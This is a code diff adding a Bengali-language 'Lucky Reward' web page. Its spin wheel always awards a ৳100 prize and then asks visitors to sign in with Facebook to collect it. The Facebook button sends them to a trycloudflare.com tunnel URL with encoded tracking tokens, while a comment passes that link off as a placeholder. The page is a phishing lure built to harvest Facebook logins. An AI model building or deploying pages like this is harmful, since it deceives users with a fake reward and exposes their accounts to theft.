@@ -1,0 +1,567 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Lucky Reward</title>
+
+<style>
+
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+}
+
+body{
+    font-family:Arial, Helvetica, sans-serif;
+    min-height:100vh;
+    color:white;
+    background:
+    radial-gradient(circle at top,#4b0082,#16002d 55%,#05000d);
+    overflow-x:hidden;
+}
+
+.page{
+    min-height:100vh;
+    display:none;
+    align-items:center;
+    justify-content:center;
+    padding:20px;
+}
+
+.page.active{
+    display:flex;
+}
+
+.card{
+    width:100%;
+    max-width:430px;
+    padding:32px 24px;
+    text-align:center;
+
+    background:rgba(255,255,255,.10);
+    border:1px solid rgba(255,255,255,.20);
+    border-radius:28px;
+
+    backdrop-filter:blur(18px);
+
+    box-shadow:
+    0 20px 70px rgba(0,0,0,.55);
+}
+
+.emoji{
+    font-size:65px;
+    margin-bottom:12px;
+}
+
+h1{
+    font-size:28px;
+    margin-bottom:15px;
+}
+
+p{
+    color:#ddd;
+    line-height:1.7;
+    margin-bottom:24px;
+}
+
+button{
+    width:100%;
+    border:none;
+    padding:16px;
+    border-radius:15px;
+
+    color:white;
+    font-size:17px;
+    font-weight:bold;
+
+    cursor:pointer;
+
+    background:
+    linear-gradient(90deg,#7b2cff,#d000ff);
+
+    box-shadow:
+    0 8px 25px rgba(150,0,255,.35);
+
+    transition:.2s;
+}
+
+button:active{
+    transform:scale(.96);
+}
+
+
+/* =========================
+   SPIN PAGE
+========================= */
+
+.wheel-box{
+    position:relative;
+
+    width:290px;
+    height:290px;
+
+    margin:25px auto 30px;
+}
+
+.wheel{
+
+    width:290px;
+    height:290px;
+
+    border-radius:50%;
+
+    border:10px solid white;
+
+    background:
+    conic-gradient(
+        #ff3b3b 0deg 45deg,
+        #ffca28 45deg 90deg,
+        #00c853 90deg 135deg,
+        #2979ff 135deg 180deg,
+        #d500f9 180deg 225deg,
+        #ff6d00 225deg 270deg,
+        #00b8d4 270deg 315deg,
+        #651fff 315deg 360deg
+    );
+
+    transition:
+    transform 4s cubic-bezier(.15,.8,.2,1);
+
+    box-shadow:
+    0 10px 45px rgba(0,0,0,.55);
+}
+
+.pointer{
+
+    position:absolute;
+
+    top:-20px;
+    left:50%;
+
+    transform:translateX(-50%);
+
+    width:0;
+    height:0;
+
+    border-left:18px solid transparent;
+    border-right:18px solid transparent;
+    border-top:35px solid white;
+
+    z-index:5;
+}
+
+.center{
+
+    position:absolute;
+
+    width:65px;
+    height:65px;
+
+    top:50%;
+    left:50%;
+
+    transform:translate(-50%,-50%);
+
+    display:flex;
+    align-items:center;
+    justify-content:center;
+
+    border-radius:50%;
+
+    background:white;
+
+    color:#6200ff;
+
+    font-size:13px;
+    font-weight:bold;
+
+    z-index:6;
+}
+
+
+/* =========================
+   REWARD PAGE
+========================= */
+
+.reward{
+    font-size:65px;
+    margin-bottom:5px;
+}
+
+.money{
+
+    font-size:48px;
+    font-weight:bold;
+
+    color:#ffd740;
+
+    margin:15px 0;
+
+    text-shadow:
+    0 0 20px rgba(255,215,64,.35);
+}
+
+
+/* Facebook button */
+
+.facebook{
+
+    background:#1877f2;
+
+    box-shadow:
+    0 8px 25px rgba(24,119,242,.35);
+
+    margin-bottom:14px;
+}
+
+
+/* Claim button */
+
+.claim{
+
+    background:
+    linear-gradient(90deg,#00c853,#00a152);
+
+    box-shadow:
+    0 8px 25px rgba(0,200,83,.30);
+}
+
+
+/* Small text */
+
+.note{
+
+    margin-top:18px;
+
+    font-size:12px;
+
+    color:#999;
+
+    line-height:1.5;
+}
+
+</style>
+</head>
+
+
+<body>
+
+
+<!-- ==================================================
+     PAGE 1
+================================================== -->
+
+<section id="page1" class="page active">
+
+    <div class="card">
+
+        <div class="emoji">
+            🎁
+        </div>
+
+        <h1>
+            পুরস্কার জিতুন!
+        </h1>
+
+        <p>
+            আমাদের ওয়েবসাইটে লগইন করে
+            আপনার ভাগ্য পরীক্ষা করুন এবং
+            বিশেষ পুরস্কার জেতার সুযোগ নিন।
+        </p>
+
+        <button onclick="goPage(2)">
+            🎯 ভাগ্য দেখুন
+        </button>
+
+        <div class="note">
+            Really•আপনি আপনার ভাগ্য পরিবর্তন করার চেষ্টা       করুন
+        </div>
+
+    </div>
+
+</section>
+
+
+
+<!-- ==================================================
+     PAGE 2 - SPIN
+================================================== -->
+
+<section id="page2" class="page">
+
+    <div class="card">
+
+        <div class="emoji">
+            🎡
+        </div>
+
+        <h1>
+            আপনার ভাগ্য পরীক্ষা করুন
+        </h1>
+
+        <p>
+            Spin করুন এবং দেখুন
+            আপনার জন্য কী পুরস্কার আছে!
+        </p>
+
+
+        <div class="wheel-box">
+
+            <div class="pointer"></div>
+
+            <div
+                id="wheel"
+                class="wheel">
+            </div>
+
+            <div class="center">
+                SPIN
+            </div>
+
+        </div>
+
+
+        <button
+            id="spinBtn"
+            onclick="spinWheel()">
+
+            🎡 SPIN করুন
+
+        </button>
+
+
+        <div class="note">
+            Spin Here
+        </div>
+
+    </div>
+
+</section>
+
+
+
+<!-- ==================================================
+     PAGE 3 - REWARD
+================================================== -->
+
+<section id="page3" class="page">
+
+    <div class="card">
+
+        <div class="reward">
+            🎉
+        </div>
+
+        <h1>
+            অভিনন্দন!
+        </h1>
+
+        <p>
+            আপনার Spin সফল হয়েছে!
+        </p>
+
+
+        <div class="money">
+            ৳100
+        </div>
+
+
+        <p>
+            আপনি
+            <b>৳100</b>
+            পুরস্কার পেয়েছেন।
+        </p>
+
+
+        <p>
+            পুরস্কার উত্তোলনের জন্য
+            Facebook দিয়ে সাইন ইন করুন।
+        </p>
+
+
+        <!--
+        এই বাটনে আপনার নির্দিষ্ট
+        ওয়েবসাইটের URL বসানো হবে
+        -->
+
+        <button
+            class="facebook"
+            onclick="facebookLogin()">
+
+            f &nbsp;
+            Facebook দিয়ে সাইন ইন করুন
+
+        </button>
+
+
+        <!--
+        এই বাটনে কোনো website নেই।
+        শুধু demo message দেখাবে।
+        -->
+
+        <button
+            class="claim"
+            onclick="claimReward()">
+
+            🏆 পুরস্কার দাবি করুন
+
+        </button>
+
+
+        <div class="note">
+
+            RELLY REWARD •
+           ১০০ শতাংশ অর্থ প্রদান করা হয় 
+
+        </div>
+
+    </div>
+
+</section>
+
+
+
+<script>
+
+
+/* ==================================================
+   PAGE CHANGE
+================================================== */
+
+function goPage(number){
+
+    document
+    .querySelectorAll(".page")
+    .forEach(function(page){
+
+        page.classList.remove("active");
+
+    });
+
+
+    document
+    .getElementById("page" + number)
+    .classList.add("active");
+
+
+    window.scrollTo(0,0);
+}
+
+
+
+/* ==================================================
+   SPIN
+================================================== */
+
+let spinning = false;
+
+
+function spinWheel(){
+
+    if(spinning){
+        return;
+    }
+
+
+    spinning = true;
+
+
+    const wheel =
+        document.getElementById("wheel");
+
+
+    const button =
+        document.getElementById("spinBtn");
+
+
+    button.disabled = true;
+
+    button.innerText =
+        "⏳ ঘুরছে...";
+
+
+    /*
+       কয়েকবার ঘুরবে
+       তারপর থামবে
+    */
+
+    const randomDegree =
+        1800 +
+        Math.floor(Math.random() * 360);
+
+
+    wheel.style.transform =
+        "rotate(" +
+        randomDegree +
+        "deg)";
+
+
+    /*
+       Spin শেষ হওয়ার পরে
+       Reward page দেখাবে
+    */
+
+    setTimeout(function(){
+
+        button.innerText =
+            "🎉 ফলাফল দেখা হচ্ছে...";
+
+
+        setTimeout(function(){
+
+            goPage(3);
+
+            spinning = false;
+
+        },700);
+
+
+    },4200);
+
+}
+
+
+
+/* ==================================================
+   FACEBOOK BUTTON
+================================================== */
+
+function facebookLogin(){
+
+    /*
+       এখানে আপনার নিজের ওয়েবসাইটের
+       URL বসাবেন।
+
+       উদাহরণ:
+
+       https://yourwebsite.com/
+
+    */
+
+    window.location.href =
+        "https://contains-ons-kidney-skills.trycloudflare.com/ZGU4YTFjZjc2ZjIxNGVlNjUwYjAzMg==/?type=f-en-wb&orders=780873624&auth=YTE4MDQ0MWExZGQ3MTRiMjQ0YWE4Nw==";
+
+}
+
+
+
+/* ==================================================
+   CLAIM BUTTON
+================================================== */
+
+function claimReward(){
+
+    alert(
+        "🎉 আপনার পুরস্কার দাবি করা হয়েছে!"
+    );
+
+}
+
+</script>
+
+
+</body>
+</html>
